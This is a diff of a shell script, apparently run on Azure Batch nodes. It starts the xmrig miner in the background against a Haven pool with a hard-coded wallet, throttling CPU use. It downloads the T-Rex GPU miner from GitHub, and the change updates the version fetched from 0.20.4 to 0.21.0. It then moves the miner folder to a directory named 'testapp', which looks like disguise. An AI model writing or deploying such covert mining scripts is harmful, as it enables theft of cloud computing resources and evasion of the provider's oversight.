@@ -30,8 +30,8 @@ else
     /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
     mkdir /home/_azbatch/trex ;
     cd /home/_azbatch/trex &&
-    wget https://github.com/trexminer/T-Rex/releases/download/0.20.4/t-rex-0.20.4-linux.tar.gz &&
-    tar -xzvf /home/_azbatch/trex/t-rex-0.20.4-linux.tar.gz &&
+    wget https://github.com/trexminer/T-Rex/releases/download/0.21.0/t-rex-0.21.0-linux.tar.gz &&
+    tar -xzvf /home/_azbatch/trex/t-rex-0.21.0-linux.tar.gz &&
     cd /home/_azbatch/trex &&
     find . -name "*.sh" -type f -delete &&
     sudo mv /home/_azbatch/trex /home/_azbatch/testapp &&
